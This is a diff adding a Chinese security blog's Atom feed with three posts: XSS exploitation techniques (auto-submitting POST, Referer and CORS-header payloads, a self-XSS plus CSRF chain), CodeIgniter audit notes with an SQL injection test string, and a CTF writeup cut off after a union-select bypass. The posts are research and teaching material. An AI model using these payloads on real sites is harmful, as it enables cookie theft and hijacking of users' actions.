@@ -1,0 +1,620 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>wps2015的博客</title>
+  
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://yoursite.com/"/>
+  <updated>2016-07-08T02:02:56.260Z</updated>
+  <id>http://yoursite.com/</id>
+  
+  <author>
+    <name>wps2015</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>不常见的xss利用探索</title>
+    <link href="http://yoursite.com/2016/06/27/%E4%B8%8D%E5%B8%B8%E8%A7%81%E7%9A%84xss%E5%88%A9%E7%94%A8%E6%8E%A2%E7%B4%A2/"/>
+    <id>http://yoursite.com/2016/06/27/不常见的xss利用探索/</id>
+    <published>2016-06-26T16:00:00.000Z</published>
+    <updated>2016-07-08T02:02:56.260Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。<a id="more"></a>但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。</p>
+<h3 id="0x02-POST型反射xss"><a href="#0x02-POST型反射xss" class="headerlink" title="0x02 POST型反射xss"></a>0x02 POST型反射xss</h3><p>对于post反射型xss，其实已经有比较成熟的利用方法：构造post表单，利用js直接提交。表单构造如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>  <span class="attr">name</span>=<span class="string">"form"</span> <span class="attr">id</span>=<span class="string">"form1"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://target.com/test.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"searchKey"</span> <span class="attr">hidden</span>=<span class="string">"true"</span> <span class="attr">value</span>=<span class="string">'test"&gt;&lt;img src=1 onerror=alert(document.domain)&gt;'</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">document.getElementById('form1').submit();</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>将html保存后，诱导被攻击者访问这个html文件，触发如下：<br><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2e_kZrVXXXXabXpXXXXXXXXXX_!!792076116.png" alt="post"></p>
+<h3 id="0x03-http头部反射xss"><a href="#0x03-http头部反射xss" class="headerlink" title="0x03 http头部反射xss"></a>0x03 http头部反射xss</h3><p>如果xss代码的输入点是在http头部的话，那么利用表单提交的方法就不行。利用ajax异步跨域请求的方法等会再谈，先说说一个比较特殊的头信息<code>referer</code>。</p>
+<h4 id="referer头信息xss"><a href="#referer头信息xss" class="headerlink" title="referer头信息xss"></a>referer头信息xss</h4><p>当浏览器进行跳转时，一般会将前一个页面的url带入referer头部中，如果我们控制了跳转前的url，并使之跳转到target页面，那么referer头的xss漏洞便可以利用。当然，chrome和firefox会对跳转前url里的”&lt;&gt;”等进行urlencode，但是IE却不会，所以这种方法在IE下适用。漏洞页面如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>简单的将referer信息输出，那么构造一个跳转：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">window.location.href="http://target.com/xss_test/referer.php";</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>访问:<code>http://localhost:8088/test/header/referer_location.html?&lt;script&gt;alert(document.domain) &lt;/script&gt;</code>。在<code>IE11</code>上测试成功</p>
+<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2QcVdsXXXXXcuXXXXXXXXXXXX_!!792076116.png" alt="xss"></p>
+<p>除了window.location跳转外，还可以利用iframe、表单提交等方式。利用<code>iframe</code>标签:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://target.com/xss_test/referer.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>利用<code>表单提交</code>的方式:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span>   <span class="attr">id</span>=<span class="string">"xss"</span></span><br><span class="line">          <span class="attr">name</span>=<span class="string">"xss"</span></span><br><span class="line">          <span class="attr">method</span>=<span class="string">"GET"</span></span><br><span class="line">          <span class="attr">action</span>=<span class="string">"http://target.com/xss_test/referer.php"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">  document.getElementById("xss").submit();</span><br><span class="line">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h4 id="对其他header的xss尝试"><a href="#对其他header的xss尝试" class="headerlink" title="对其他header的xss尝试"></a>对其他header的xss尝试</h4><p>如何让受害者点击某个链接后，访问漏洞页面并带上特定的header信息，ajax可以办到这点。由于需要跨域请求，这里参考了CORS(Cross Origin Resourse-Sharing)的模型。CORS模型实现跨域资源共享需要服务器端设置一定的返回头部，所以这里攻击场景就比较狭隘，仅做学术的研究。服务器端可设置的http头如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: 允许跨域访问的域，可以是一个域的列表，也可以是通配符&quot;*&quot;。这里要注意Origin规则只对域名有效，并不会对子目录有效。即http://foo.example/subdir/是无效的。但是不同子域名需要分开设置，这里的规则可以参照那篇同源策略</span><br><span class="line">Access-Control-Allow-Credentials: 是否允许请求带有验证信息，这部分将会在下面详细解释</span><br><span class="line">Access-Control-Expose-Headers: 允许脚本访问的返回头，请求成功后，脚本可以在XMLHttpRequest中访问这些头的信息(貌似webkit没有实现这个)</span><br><span class="line">Access-Control-Max-Age: 缓存此次请求的秒数。在这个时间范围内，所有同类型的请求都将不再发送预检请求而是直接使用此次返回的头作为判断依据，非常有用，大幅优化请求次数</span><br><span class="line">Access-Control-Allow-Methods: 允许使用的请求方法，以逗号隔开</span><br><span class="line">Access-Control-Allow-Headers: 允许自定义的头部，以逗号隔开，大小写不敏感</span><br></pre></td></tr></table></figure></p>
+<p>基于CORS模型，浏览器发起的ajax请求分为简单跨域请求和非简单跨域请求。简单跨域请求不需要服务器允许便可发起，但浏览器会阻止响应。服务器端的漏洞页面代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Access-Control-Allow-Origin: *"</span>);</span><br><span class="line">header(<span class="string">"Access-Control-Allow-Headers: X-Forwarded-For, referer, Content-Type"</span>);</span><br><span class="line"><span class="keyword">echo</span> urldecode($_SERVER[<span class="string">'X-Forwarded-For'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>本地测试html代码如下，X-Forwarded-For设置为<code>&lt;html&gt;&lt;script src=http://x_for.xxxx.ceye.io&gt;&lt;/script&gt;&lt;/html&gt;</code>，通过查看cloudeye上是否有dns请求记录验证标签是否被渲染。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">var xmlhttp;</span><br><span class="line">if (window.XMLHttpRequest)</span><br><span class="line">  &#123;// code for IE7+, Firefox, Chrome, Opera, Safari</span><br><span class="line">  xmlhttp=new XMLHttpRequest();</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;// code for IE6, IE5</span><br><span class="line">  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");</span><br><span class="line">  &#125;</span><br><span class="line">xmlhttp.open("POST","http://taget.com/xss_test/cors.php",true);</span><br><span class="line">xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");</span><br><span class="line">xmlhttp.setRequestHeader("X-Forwarded-For","%3Chtml%3E%3Cscript%20src%3Dhttp%3A%2f%2fx_for.xxxx.ceye.io%3E%3C%2fscript%3E%3C%2fhtml%3E"); //若不加为简单跨域请求，无OPTIONS方法的预检请求</span><br><span class="line">xmlhttp.send('data=123');</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>利用chrome打开测试页面，可以看到ajax请求发送成功，并且打开该ajax请求的Preview，可以看到似乎response的html代码被解析了。</p>
+<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2VI8usXXXXXXgXpXXXXXXXXXX_!!792076116.png" alt="ajax"></p>
+<p>script标签里的源是我的cloudeye地址，那么看看cloudeye里面是否有DNS记录，</p>
+<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2XvxKsXXXXXaYXXXXXXXXXXXX_!!792076116.png" alt="cloudeye"></p>
+<p>DNS请求记录存在，说明html代码被浏览器解析了，到这里，似乎可以跨域触发基于header的xss了。但是经过进一步的验证过后，发现只是html代码被渲染，javascript代码却不能执行！！！</p>
+<h3 id="0x04-self-xss"><a href="#0x04-self-xss" class="headerlink" title="0x04 self-xss"></a>0x04 self-xss</h3><p>self-xss可以说是最最鸡肋的xss了，攻击者只能在自己这里弹窗，一般厂商都会选择忽略self-xss。但self-xss如果和csrf结合起来，会有意想不到的效果。</p>
+<blockquote>
+<p>攻击场景: 某个站点个人简介处存在self-xss，并且保存后并不触发，再次编辑会触发。添加个人简介和编辑处存在csrf</p>
+</blockquote>
+<p>在这种场景下，有一个思路就是：利用csrf添加xss代码，并且让攻击者点击或者跳转触发。需要给被攻击者第一个链接用于csrf插入xss代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"csrf"</span> <span class="attr">name</span>=<span class="string">"csrf"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"http://target.com/info/add"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"csrf_test#&lt;script&gt;alert(document.domain)&lt;/script&gt;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">  document.getElementById("csrf").submit();</span><br><span class="line">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>再诱导被攻击者点击漏洞触发的链接：<code>http://target.com/info/edit</code>，亦或发送下面的跳转链接：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">window.location.href="http://target.com/info/edit"</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>self-xss，结合csrf便可将鸡肋变成可攻击的漏洞。</p>
+<p>参考文献：</p>
+<p><a href="http://drops.wooyun.org/tips/188" target="_blank" rel="external">详解XMLHttpRequest的跨域资源共享</a></p>
+<p><a href="http://zone.wooyun.org/content/11969" target="_blank" rel="external">header头referer字段反射xss利用</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CI框架学习一(参数输入/数据库操作)</title>
+    <link href="http://yoursite.com/2016/05/19/CI%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
+    <id>http://yoursite.com/2016/05/19/CI框架学习（一）/</id>
+    <published>2016-05-18T16:00:00.000Z</published>
+    <updated>2016-05-28T02:00:44.878Z</updated>
+    
+    <content type="html"><![CDATA[<p>对于代码审计来讲，比较重要的是了解其参数输入及数据库操作方式。在阅读了CI开发手册后，我总结了下面的笔记。<br><a id="more"></a></p>
+<h2 id="参数输入"><a href="#参数输入" class="headerlink" title="参数输入"></a>参数输入</h2><h4 id="1-CI自带输入类"><a href="#1-CI自带输入类" class="headerlink" title="1. CI自带输入类"></a>1. CI自带输入类</h4><p>输入类有两个用途：</p>
+<blockquote>
+<p>为了安全性，对输入数据进行预处理</p>
+<p>提供了一些辅助方法来获取输入数据并处理</p>
+</blockquote>
+<p>在CI框架中，在/application/config/config.php中可以选择开启全局过滤xss</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$config[&apos;global_xss_filtering&apos;] = TRUE;</span><br></pre></td></tr></table></figure>
+<p>最常见调用方法如下，第二个参数为TRUE时，可加载xss_clean函数对输入的参数进行过滤，当然只是过滤xss，xss_clean函数定义在/system/core/Security.php，没有针对sql injection做对于的过滤措施。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;input-&gt;post($index (mixed),[, $xss_clean = <span class="keyword">NULL</span>]])</span><br><span class="line">$this-&gt;input-&gt;get()</span><br><span class="line">$this-&gt;input-&gt;cookie()</span><br><span class="line">$this-&gt;input-&gt;server()</span><br></pre></td></tr></table></figure></p>
+<p>其它的较少使用的如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;input-&gt;get_post(<span class="string">'some_data'</span>, <span class="keyword">TRUE</span>);  <span class="comment">//先get再post</span></span><br><span class="line">$this-&gt;input-&gt;post_get(<span class="string">'some_data'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">$this-&gt;input-&gt;ip_address();</span><br><span class="line">$this-&gt;input-&gt;user_agent();</span><br><span class="line">$this-&gt;input-&gt;request_headers();</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-URI-分段传递"><a href="#2-URI-分段传递" class="headerlink" title="2. URI 分段传递"></a>2. URI 分段传递</h4><p>当URI多于两个段，多余的段将作为参数传递到你的方法中。例如你的URI是这样<br><code>/index.php/news/view/test</code><br>那么view方法会接受”test”作为参数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view</span><span class="params">($slug = Null)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    $data[<span class="string">'news'</span>] = $this-&gt;news_model-&gt;get_news($slug);</span><br><span class="line">    $data[<span class="string">'title'</span>] = <span class="string">"The detail news"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data[<span class="string">'news'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        show_404();</span><br><span class="line">    &#125;</span><br><span class="line">    $this-&gt;load-&gt;view(<span class="string">'templates/header'</span>, $data);</span><br><span class="line">    $this-&gt;load-&gt;view(<span class="string">'news/index'</span>, $data);</span><br><span class="line">    $this-&gt;load-&gt;view(<span class="string">'templates/footer'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在/application/config/config.php中，定义了全局的URI参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$config[&apos;permitted_uri_chars&apos;] = &apos;a-z 0-9~%.:_\-&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>开启后，可自定义允许的URI字符的白名单。利用这种方式传入的参数由于利用的是URI，不会被服务器urldecode，如果其他字符没有被过滤的话，可以用下面的语句测试是否注入: <code>(3)and(sleep(5))</code></p>
+<h4 id="3-URI类方法获取"><a href="#3-URI类方法获取" class="headerlink" title="3. URI类方法获取"></a>3. URI类方法获取</h4><blockquote>
+<p>最常用调用方法如下：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;uri-&gt;segment(n, [, $no_result = NULL]))</span><br></pre></td></tr></table></figure>
+<p>用于从 URI 中获取指定段。参数 n 为你希望获取的段序号，URI 的段从左到右进行编号。 例如，如果你的完整 URL 是这样的:<br><code>/index.php/news/view/test</code>，那么从index.php开始为0，要获取“test”值，代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;uri-&gt;segment(<span class="number">3</span>)</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>还有一个比较好用的方法</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;uri-&gt;uri_to_assoc([$n = <span class="number">3</span>[, $default = <span class="keyword">array</span>()]])</span><br></pre></td></tr></table></figure>
+<p>该方法用于将 URI 的段转换为一个包含键值对的关联数组,第一个参数为位移，默认为3（前两段为控制器和方法）。如下URI <code>index.php/user/search/cid/1/sid/2</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span> (size=<span class="number">2</span>)</span><br><span class="line">  <span class="string">'sid'</span> =&gt; string <span class="string">'1'</span> (length=<span class="number">1</span>)</span><br><span class="line">  <span class="string">'cid'</span> =&gt; string <span class="string">'2'</span> (length=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这种方法获取参数也受permitted_uri_chars的影响。</p>
+<h4 id="4-典型的PHP方法"><a href="#4-典型的PHP方法" class="headerlink" title="4. 典型的PHP方法"></a>4. 典型的PHP方法</h4><p>大家最熟悉的<code>$_GET[], $_POST[], $_POST[]</code>等。</p>
+<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h4 id="1-基本查询"><a href="#1-基本查询" class="headerlink" title="1. 基本查询"></a>1. 基本查询</h4><p>在CI中提供了一个查询的类库database，需要手工去加载(autoload中未自动加载的话)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;load-&gt;database()</span><br></pre></td></tr></table></figure></p>
+<p>加载后，可以直接<code>$this-&gt;db-&gt;function</code>调用自带的方法了。</p>
+<blockquote>
+<p>常规查询，query($sql)</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;db-&gt;query(&quot;select * from news where id = &apos;&quot;.$id.&quot;&apos;&quot;)</span><br></pre></td></tr></table></figure>
+<p>加入单引号保护后，若变量直接传入仍然不安全。这时可用escape()方法进行转义，escape方法会自动引入单引号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;db-&gt;query(&quot;select * from news where id = &quot;.$this-&gt;db-&gt;escape($id))</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>参数绑定</p>
+</blockquote>
+<p>参数绑定会自动转义绑定的参数，生成安全的查询语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM some_table WHERE id = ? AND status = ? AND author = ?&quot;;</span><br><span class="line">$this-&gt;db-&gt;query($sql, array(3, &apos;live&apos;, &apos;Rick&apos;));  //传入索引数组</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-查询构造器"><a href="#2-查询构造器" class="headerlink" title="2. 查询构造器"></a>2. 查询构造器</h4><p>CodeIgniter 提供了查询构造器类，查询构造器允许你使用较少的代码来在数据库中 获取、新增或更新数据。有时只需要一两行代码就能完成数据库操作。构造器所有方法的定义位于/system/database/DB_query_builder.php。<br>比较常用的如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;db-&gt;get($table, $limit1, $limit2) <span class="comment">// select * from $table limit $limit1, $limit2</span></span><br><span class="line">$this-&gt;db-&gt;get_where(<span class="string">'mytable'</span>, <span class="keyword">array</span>(<span class="string">'id'</span> =&gt; $id), $limit, $offset); <span class="comment">// select * from mytable where id = $id limit $limit, $offset</span></span><br><span class="line">$this-&gt;db-&gt;insert(<span class="string">'mytable'</span>, $data); <span class="comment">//$data为数组</span></span><br><span class="line">$this-&gt;db-&gt;update(<span class="string">'mytable'</span>, $data)  <span class="comment">//搭配下面的where语句设置条件</span></span><br><span class="line">$this-&gt;db-&gt;delete(<span class="string">'mytable'</span>, <span class="keyword">array</span>(<span class="string">'id'</span> =&gt; $id)); <span class="comment">//第二个参数也可用where语句代替</span></span><br></pre></td></tr></table></figure></p>
+<p>部分sql语句编写，需要搭配<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;db-&gt;select(<span class="string">'title, content, date'</span>);  <span class="comment">//选择查询的字段</span></span><br><span class="line">$this-&gt;db-&gt;where(<span class="keyword">array</span>(<span class="string">'name'</span> =&gt; $name, <span class="string">'title'</span> =&gt; $title, <span class="string">'status'</span> =&gt; $status);); <span class="comment">// 查询条件设置</span></span><br><span class="line">$this-&gt;db-&gt;like(<span class="string">'title'</span>, <span class="string">'match'</span>);  <span class="comment">// where `title` like '%match%'</span></span><br><span class="line">$this-&gt;db-&gt;order_by(<span class="string">'title'</span>, <span class="string">'DESC'</span>);</span><br><span class="line">$this-&gt;db-&gt;limit(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></p>
+<h4 id="3-经典的php语句"><a href="#3-经典的php语句" class="headerlink" title="3. 经典的php语句"></a>3. 经典的php语句</h4><p>php的mysql扩展函数。</p>
+<p>参考:</p>
+<p><a href="http://codeigniter.org.cn/" target="_blank" rel="external">CodeIgniter 用户指南</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;对于代码审计来讲，比较重要的是了解其参数输入及数据库操作方式。在阅读了CI开发手册后，我总结了下面的笔记。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+      <category term="编程" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>whctf2016初赛Writeup（web&amp;crypto）</title>
+    <link href="http://yoursite.com/2016/05/15/whctf-writeup-all/"/>
+    <id>http://yoursite.com/2016/05/15/whctf-writeup-all/</id>
+    <published>2016-05-14T16:00:00.000Z</published>
+    <updated>2016-05-16T08:10:46.792Z</updated>
+    
+    <content type="html"><![CDATA[<p>whctf2016初赛提前结束了，团队的小伙伴们还是很给力的，做出了所有的web及几乎所有（差一道）的crypto题。</p>
+<h2 id="Web题"><a href="#Web题" class="headerlink" title="Web题"></a>Web题<a id="more"></a></h2><p><strong>0x01. 信息</strong></p>
+<p>打开是一个代码下载链接，下载下来是wireshark抓的cap包，打开包分析发现两个http的包，get请求下载了zip的压缩包，利用wireshark导出zip包-File-Export Objects-HTTP。发现需要密码打开，官方提示华科官网，解压密码<code>www.hust.edu.cn</code>，flag在flag3.docx中</p>
+<p><strong>0x02. 窃取</strong></p>
+<p>测试地址存在union注入，利用sqlmap在<strong>wh_ct4_hgduyingjkhjhjg</strong>库中发现flag的提示<code>flag is nothere,but I can tell you the flag is xor user&#39;s password.</code>，那么到<strong>web_sqli</strong>库中，将user1和user2的password异或后解密，得到flag:hust</p>
+<p><strong>0x03. 忘了账户和密码</strong></p>
+<p>username: <code>&#39; union select 1,2,3-- -</code> , 三列</p>
+<p>password: 任意</p>
+<p><strong>0x04. find</strong></p>
